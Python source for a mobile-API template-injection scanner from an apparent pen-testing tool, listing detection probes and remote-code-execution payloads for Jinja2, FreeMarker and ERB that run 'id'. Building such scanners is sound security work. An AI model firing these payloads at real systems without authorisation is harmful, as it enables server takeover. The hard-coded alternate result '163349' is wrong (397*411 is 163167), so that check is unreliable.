"""
Jarwis AGI Pen Test - Mobile SSTI (Server-Side Template Injection) Scanner

Detects SSTI vulnerabilities in mobile app API traffic.
Extends BaseMobileScanner for MITM-first methodology.

OWASP Mobile Top 10 2024: M4 - Insufficient Input/Output Validation
CWE-1336: Improper Neutralization of Special Elements Used in a Template Engine

Mobile-specific considerations:
- Mobile APIs often use template engines for emails, PDFs, invoices
- Common in e-commerce and fintech mobile apps
- Backend frameworks: Flask/Jinja2, Django, Node.js/Handlebars, Ruby/ERB
"""

import asyncio
import logging
import re
from typing import Dict, List, Optional, Any

from attacks.mobile.base_mobile_scanner import (
    BaseMobileScanner,
    MobileFinding,
    Severity,
    Confidence
)
from core.mobile_http_client import MobileHTTPClient, MobileAttackResponse
from core.mobile_request_store import MobileRequestStoreDB, StoredMobileRequest

logger = logging.getLogger(__name__)


class MobileSSTIScanner(BaseMobileScanner):
    """
    Server-Side Template Injection Scanner for Mobile APIs
    
    Scans mobile app traffic for SSTI vulnerabilities.
    Uses MITM-captured requests to test injection points.
    
    Attack vectors:
    - Jinja2 (Python Flask)
    - Twig (PHP)
    - Freemarker (Java)
    - Pebble (Java)
    - Handlebars/Mustache (Node.js)
    - ERB (Ruby)
    - Smarty (PHP)
    """
    
    # Scanner identification
    scanner_name = "mobile_ssti"
    attack_type = "ssti"
    vuln_type = "ssti"
    owasp_category = "M4"  # Insufficient Input/Output Validation
    cwe_id = "CWE-1336"
    
    # Math result for detection
    MATH_RESULT = "49"  # Result of 7*7
    MATH_RESULT_ALT = "163349"  # Result of 397*411
    
    # Template engine detection payloads with unique math results
    DETECTION_PAYLOADS = {
        # Jinja2 / Twig detection
        'jinja2_twig': [
            '{{7*7}}',
            '{{7*\'7\'}}',
            '${7*7}',
            '#{7*7}',
            '*{7*7}',
        ],
        
        # Freemarker detection
        'freemarker': [
            '${7*7}',
            '<#assign x=7*7>${x}',
            '#{7*7}',
        ],
        
        # Pebble detection
        'pebble': [
            '{{ 7*7 }}',
            '{% set x = 7*7 %}{{ x }}',
        ],
        
        # Handlebars/Mustache detection
        'handlebars': [
            '{{#with "s" as |string|}}{{#with "e"}}{{#with split as |conslist|}}{{this.pop}}{{this.push (lookup string.sub "constructor")}}{{this.pop}}{{#with string.split as |codelist|}}{{this.pop}}{{this.push "return 7*7"}}{{this.pop}}{{#each conslist}}{{#with (string.sub.apply 0 codelist)}}{{this}}{{/with}}{{/each}}{{/with}}{{/with}}{{/with}}{{/with}}',
        ],
        
        # ERB (Ruby) detection
        'erb': [
            '<%= 7*7 %>',
            '<%= `echo 49` %>',
        ],
        
        # Smarty (PHP) detection
        'smarty': [
            '{php}echo 7*7;{/php}',
            '{7*7}',
            '{$smarty.version}',
        ],
        
        # Mako detection
        'mako': [
            '${7*7}',
            '<% import os; x=7*7 %>${x}',
        ],
    }
    
    # Simple universal probes (try these first)
    UNIVERSAL_PROBES = [
        '{{7*7}}',           # Jinja2, Twig, Pebble
        '${7*7}',            # Freemarker, Mako
        '<%= 7*7 %>',        # ERB
        '#{7*7}',            # Multiple engines
        '*{7*7}',            # Spring EL
        '{{397*411}}',       # Alt math for filtering
        '${397*411}',        # Alt math
    ]
    
    # RCE payloads for confirmed SSTI (use with caution)
    RCE_PAYLOADS = {
        'jinja2': [
            "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
            "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",
        ],
        'freemarker': [
            '<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}',
        ],
        'erb': [
            '<%= system("id") %>',
        ],
    }
    
    # Template error patterns
    ERROR_PATTERNS = [
        r'TemplateSyntaxError',
        r'UndefinedError',
        r'jinja2\.exceptions',
        r'Twig.*Error',
        r'freemarker\.core',
        r'FreeMarker',
        r'pebble\.PebbleException',
        r'Handlebars.*Error',
        r'ERB.*Error',
        r'SyntaxError.*template',
        r'undefined\s+method.*for\s+nil',
        r'Smarty.*error',
    ]
    
    # High-priority parameters for SSTI
    PRIORITY_PARAMS = [
        'name', 'title', 'message', 'email', 'content', 'template',
        'text', 'subject', 'body', 'description', 'comment', 'note',
        'greeting', 'address', 'invoice', 'receipt', 'order', 'data',
        'label', 'header', 'footer', 'signature', 'preview'
    ]
    
    def __init__(
        self,
        http_client: MobileHTTPClient,
        request_store: MobileRequestStoreDB,
        test_rce: bool = False,
        **kwargs
    ):
        """
        Initialize Mobile SSTI Scanner.
        
        Args:
            http_client: Mobile HTTP client for attacks
            request_store: Mobile request store
            test_rce: Whether to test RCE payloads (dangerous)
        """
        super().__init__(http_client, request_store, **kwargs)
        self.test_rce = test_rce
    
    def get_payloads(self) -> List[str]:
        """Return universal SSTI detection payloads."""
        return self.UNIVERSAL_PROBES[:self.max_payloads_per_param]
    
    def is_applicable(self, request: StoredMobileRequest) -> bool:
        """Check if request should be tested for SSTI."""
        # Skip static resources
        if request.endpoint_type == 'static':
            return False
        
        # Must have parameters
        if not request.parameters and not request.body:
            return False
        
        # Check for SSTI-prone parameters
        all_params = list(request.parameters.keys())
        if request.body:
            try:
                import json
                body_data = json.loads(request.body)
                if isinstance(body_data, dict):
                    all_params.extend(body_data.keys())
            except:
                pass
        
        param_names = [p.lower() for p in all_params]
        has_priority_param = any(
            any(prio in name for prio in self.PRIORITY_PARAMS)
            for name in param_names
        )
        
        return has_priority_param or request.endpoint_type == 'dynamic'
    
    async def scan_request(self, request: StoredMobileRequest) -> List[MobileFinding]:
        """
        Scan a request for SSTI vulnerabilities.
        
        Flow:
        1. Get baseline response
        2. Test universal probes for math execution
        3. Test engine-specific payloads if math detected
        4. Identify template engine
        """
        findings = []
        
        # Get baseline response
        baseline = await self.get_baseline(request)
        if not baseline:
            logger.warning(f"[{self.scanner_name}] No baseline for {request.url}")
            return findings
        
        # Test query parameters
        for param_name, param_value in request.parameters.items():
            if self._cancelled:
                break
            
            ssti_finding = await self._test_ssti(
                request, param_name, "query", baseline
            )
            if ssti_finding:
                findings.append(ssti_finding)
        
        # Test JSON body fields
        body_findings = await self._test_body_ssti(request, baseline)
        findings.extend(body_findings)
        
        return findings
    
    async def _test_ssti(
        self,
        request: StoredMobileRequest,
        param_name: str,
        location: str,
        baseline: MobileAttackResponse
    ) -> Optional[MobileFinding]:
        """Test parameter for SSTI using universal probes."""
        for payload in self.UNIVERSAL_PROBES:
            response = await self.send_payload(
                request,
                payload,
                location=location,
                param_name=param_name
            )
            
            if not response:
                continue
            
            response_text = response.body if isinstance(response.body, str) else str(response.body)
            
            # Check for math result (7*7=49 or 397*411=163167)
            if self.MATH_RESULT in response_text or self.MATH_RESULT_ALT in response_text:
                # Verify not in baseline
                baseline_text = baseline.body if isinstance(baseline.body, str) else str(baseline.body)
                if self.MATH_RESULT not in baseline_text and self.MATH_RESULT_ALT not in baseline_text:
                    # Identify template engine
                    engine = self._identify_engine(payload, response_text)
                    
                    return self.create_finding(
                        request=request,
                        response=response,
                        payload=payload,
                        title=f"Server-Side Template Injection in: {param_name}",
                        description=(
                            f"The parameter '{param_name}' is vulnerable to Server-Side Template "
                            f"Injection (SSTI). The payload '{payload}' was executed as template code "
                            f"and returned the math result. Detected engine: {engine}. "
                            "This vulnerability can lead to Remote Code Execution (RCE)."
                        ),
                        severity=Severity.CRITICAL,
                        confidence=Confidence.HIGH
                    )
            
            # Check for template errors
            if self._detect_template_error(response_text):
                return self.create_finding(
                    request=request,
                    response=response,
                    payload=payload,
                    title=f"Possible SSTI (Template Error) in: {param_name}",
                    description=(
                        f"The parameter '{param_name}' triggered a template engine error with "
                        f"payload '{payload}'. This indicates template injection may be possible "
                        "with the correct syntax."
                    ),
                    severity=Severity.HIGH,
                    confidence=Confidence.MEDIUM
                )
        
        return None
    
    async def _test_body_ssti(
        self,
        request: StoredMobileRequest,
        baseline: MobileAttackResponse
    ) -> List[MobileFinding]:
        """Test JSON body fields for SSTI."""
        findings = []
        
        if not request.body:
            return findings
        
        try:
            import json
            body_data = json.loads(request.body)
            if not isinstance(body_data, dict):
                return findings
        except (json.JSONDecodeError, TypeError):
            return findings
        
        for field_name, field_value in body_data.items():
            if not isinstance(field_value, str):
                continue
            
            # Only test priority fields
            if not any(prio in field_name.lower() for prio in self.PRIORITY_PARAMS):
                continue
            
            for payload in self.UNIVERSAL_PROBES[:4]:
                modified_body = body_data.copy()
                modified_body[field_name] = payload
                
                response = await self.send_payload(
                    request,
                    json.dumps(modified_body),
                    location="body",
                    param_name=field_name
                )
                
                if not response:
                    continue
                
                response_text = response.body if isinstance(response.body, str) else str(response.body)
                baseline_text = baseline.body if isinstance(baseline.body, str) else str(baseline.body)
                
                if (self.MATH_RESULT in response_text or self.MATH_RESULT_ALT in response_text):
                    if self.MATH_RESULT not in baseline_text and self.MATH_RESULT_ALT not in baseline_text:
                        engine = self._identify_engine(payload, response_text)
                        
                        findings.append(self.create_finding(
                            request=request,
                            response=response,
                            payload=payload,
                            title=f"SSTI in JSON field: {field_name}",
                            description=(
                                f"The JSON field '{field_name}' is vulnerable to SSTI. "
                                f"Template engine: {engine}. This can lead to RCE."
                            ),
                            severity=Severity.CRITICAL,
                            confidence=Confidence.HIGH
                        ))
                        break  # One finding per field
        
        return findings
    
    def _identify_engine(self, payload: str, response: str) -> str:
        """Attempt to identify the template engine."""
        if '{{' in payload and '}}' in payload:
            if 'jinja' in response.lower():
                return "Jinja2 (Python)"
            elif 'twig' in response.lower():
                return "Twig (PHP)"
            else:
                return "Jinja2/Twig/Pebble"
        elif '${' in payload:
            if 'freemarker' in response.lower():
                return "FreeMarker (Java)"
            else:
                return "FreeMarker/Mako"
        elif '<%=' in payload:
            return "ERB (Ruby)"
        elif '#{' in payload:
            return "Spring EL/EL"
        else:
            return "Unknown"
    
    def _detect_template_error(self, response_text: str) -> bool:
        """Detect template engine errors in response."""
        for pattern in self.ERROR_PATTERNS:
            try:
                if re.search(pattern, response_text, re.IGNORECASE):
                    return True
            except re.error:
                continue
        return False
